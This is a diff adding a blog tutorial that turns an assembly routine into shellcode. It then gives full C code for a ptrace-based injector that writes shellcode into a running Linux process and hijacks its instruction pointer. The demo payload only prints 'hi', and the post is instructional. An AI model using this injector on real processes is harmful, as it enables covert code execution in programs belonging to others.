@@ -1,0 +1,251 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fischer's Lab</title>
+    <script src="https://kit.fontawesome.com/29844f2f13.js" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="../style.css">
+
+</head>
+
+<body>
+    <header>
+        <h1>Fischer's Lab</h1>
+        <nav>
+          
+            <ul>
+                <li><a href="../index.html">Home</a></li>
+                <li><a href="./posts.html">Posts</a></li>
+                <li><a href="./about.html">About</a></li>
+                <li><a href="https://github.com/fischer36" aria-label="Github"><i class="fab fa-github"></i></a></li>
+
+            </ul>
+        </nav>
+    </header>
+    <main class="post">
+        <article>
+            <h1>Shellcode injection and execution</h1>
+            <p class="date">Sep 24, 2024</p>
+            <ul class="tags">
+                <li>Shellcode</li//>
+                <li>Linux</li>
+                <li>C</li>
+            </ul>
+            <p>The following article explores the concept of shellcode. We will <a href="#creating">create</a>, <a href="#inject">inject & execute</a>, our shellcode payload into a process.</p>
+
+        <h2 id="creating">Creating shellcode</h1>
+<p>To create our payload, we will first create an assembly program—consisting of our desired payload behaviour, that we will dissassemble into shellcode.</p>
+        <p><b>asm.s</b> - Our basic assembly program contains an entry point that calls "proc" and then exits through sys calls, and a procedure that prints "hi" to stdout and then exits—before returning to the entry point caller.
+       <pre><code>
+.global _start
+.intel_syntax noprefix
+
+
+_start: # entry point
+    call proc # call the proc function
+    mov rax, 60 # sys_exit
+    mov rdi, 69 # exit code
+    syscall
+
+proc:
+    push 0x6968 # "hi"
+    mov rax, 1 # sys_write
+    mov rdi, 1 # stdout
+    mov rsi, rsp # pointer our "hi" string on the stack
+    mov rdx, 2 # Length of "hi"
+    syscall
+    mov rax, 60 # sys_exit
+    mov rdi, 69 # exit code
+    syscall
+    pop rax # pop hi
+    ret # return to _start
+</code></pre>
+<p>Let's compile and run our assembly program:</p>
+<pre><code>
+$ as asm.s -o asm.o 
+$ ld asm.o -o asm
+$ ./asm 
+Output: hi
+</code></pre>
+
+    <p>Now that we have our assembly program, we will use objdump in order to extract the shellcode for our "proc" procedure:</p>
+<pre><code>
+$ objdump -D asm 
+asm:     file format elf64-x86-64
+Disassembly of section .text:
+
+0000000000401000 <_start>:
+  401000:	e8 10 00 00 00       	call   401015 <proc>
+  401005:	48 c7 c0 3c 00 00 00 	mov    $0x3c,%rax
+  40100c:	48 c7 c7 45 00 00 00 	mov    $0x45,%rdi
+  401013:	0f 05                	syscall 
+
+0000000000401015 <proc>:
+  401015:	68 68 69 00 00       	push   $0x6968 ; ------- start
+  40101a:	48 c7 c0 01 00 00 00 	mov    $0x1,%rax
+  401021:	48 c7 c7 01 00 00 00 	mov    $0x1,%rdi
+  401028:	48 89 e6             	mov    %rsp,%rsi
+  40102b:	48 c7 c2 02 00 00 00 	mov    $0x2,%rdx
+  401032:	0f 05                	syscall 
+  401034:	48 c7 c0 3c 00 00 00 	mov    $0x3c,%rax
+  40103b:	48 c7 c7 45 00 00 00 	mov    $0x45,%rdi
+  401042:	0f 05                	syscall 
+  401044:	58                   	pop    %rax
+  401045:	c3                   	ret ;------------------- end
+
+; Copying the hex values from start to end of our prodecure results in the shellcode:
+; \x68\x68\x69\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7
+; \x01\x00\x00\x00\x48\x89\xe6\x48\xc7\xc2\x02\x00\x00\x00\x0f\x05\x48
+; \xc7\xc0\x3c\x00\x00\x00\x48\xc7\xc7\x45\x00\x00\x00\x0f\x05\x58\xc3
+
+</code></pre>
+<p>demo.c - C program to verify the shellcode:
+
+</p>
+<pre><code>
+#include <stdio.h>
+__attribute__((section(".text"))) static char code[] = // Our payload
+    "\x68\x68\x69\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00"
+    "\x00\x48\x89\xe6\x48\xc7\xc2\x02\x00\x00\x00\x0f\x05\x48\xc7\xc0\x3c\x00"
+    "\x00\x00\x48\xc7\xc7\x45\x00\x00\x00\x0f\x05\x58\xc3";
+
+int main(int argc, char *argv[]) {
+  ((void (*)())code)(); // Cast code as a function pointer and call it
+  printf("This will not be printed because the shellcode exits");
+  return 1;
+}
+
+</code></pre>
+<p>Compile and run demo.c:</p>
+<pre><code>
+$ gcc main.c -o main
+$ ./main 
+Output: hi // Successful payload execution
+</code></pre>
+        <h2 id="inject">Injection and Execution</h1>
+        <p>injector.c - This program will inject and execute our payload in a target process using ptrace.</p>
+ <pre><code>
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ptrace.h>
+#include <sys/types.h>
+#include <sys/user.h>
+#include <sys/wait.h>
+#include <unistd.h>
+
+char payload[] = // Shellcode
+    "\x68\x68\x69\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x48\xc7\xc7\x01\x00\x00"
+    "\x00\x48\x89\xe6\x48\xc7\xc2\x02\x00\x00\x00\x0f\x05\x48\xc7\xc0\x3c\x00"
+    "\x00\x00\x48\xc7\xc7\x45\x00\x00\x00\x0f\x05\x58\xc3";
+
+int main(int argc, char *argv[]) {
+  if (argc != 2) {
+    printf(stderr, "Usage: %s <pid>\n", argv[0]);
+    return EXIT_FAILURE;
+  }
+
+  printf("Trying to inject process with pid: %s\n", argv[1]);
+  int pid = atoi(argv[1]);
+
+  // Ptrace attach
+  if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1) {
+    puts("Error: ptrace attach");
+    return -1;
+  }
+
+  // Freze the process
+  waitpid(pid, NULL, 0);
+
+  // Read memory mappings
+  char maps[256];
+  snprintf(maps, sizeof(maps), "/proc/%d/maps", pid);
+  FILE *maps_file = fopen(maps, "r");
+  if (!maps_file) {
+    puts("Error: fopen");
+    return 1;
+  }
+
+  // Search for a memory mapping with executable privilege
+  // Usually the first memory mapping contains the program itself thus it is
+  // executable
+  char line[256];
+  while (fgets(line, sizeof(line), maps_file)) {
+
+    // x means executable
+    if (strstr(line, "r-xp")) {
+      {
+        // Parse start- and end addresses for mapping.
+        char *start_str = strtok(line, "-");
+        char *end_str = strtok(NULL, " ");
+
+        if (start_str && end_str) {
+          unsigned long start_addr = strtoul(start_str, NULL, 16);
+          unsigned long end_addr = strtoul(end_str, NULL, 16);
+
+          printf("Start address: %lx\n", start_addr);
+          printf("End address: %lx\n", end_addr);
+
+          // Write our payload at the begining of the mapping
+          for (int i = 0; i < sizeof(payload); i += sizeof(unsigned char)) {
+            unsigned char data = 0;
+            memcpy(&data, &payload[i], sizeof(unsigned char));
+            if (ptrace(PTRACE_POKEDATA, pid, start_addr + i, data) == -1) {
+              puts("Error: ptrace pokedata");
+              return -1;
+            }
+          }
+
+          // Get the current registers
+          struct user_regs_struct regs;
+          if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1) {
+            puts("Error: ptrace getregs");
+            return -1;
+          }
+
+          // Get the current instruction pointer to start_address
+          regs.rip = start_addr;
+
+          // Set our modified registesr
+          if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1) {
+            puts("Error: ptrace setregs");
+            return -1;
+          }
+
+          // Resmume execution of the process
+          if (ptrace(PTRACE_CONT, pid, NULL, NULL) == -1) {
+            puts("Error: ptrace cont");
+            return -1;
+          }
+
+          puts("Shellcode injected successfully");
+          // Detach from the process
+          ptrace(PTRACE_DETACH, pid, NULL, NULL);
+
+          // Close maps file handle after copying its data
+          fclose(maps_file);
+          return -1;
+        }
+      }
+    }
+  }
+}
+
+ </code></pre>       
+ <p>Compile and run the injector with the target process id (pid):</p>
+ <pre><code>
+$ gcc injector.c -o injector
+$ ./injector 1234
+
+The target process with pid 1234, prints "hi" and then exit.
+ </code></pre>       
+
+        </article>
+    </main>
+</body>
+  
+</html>
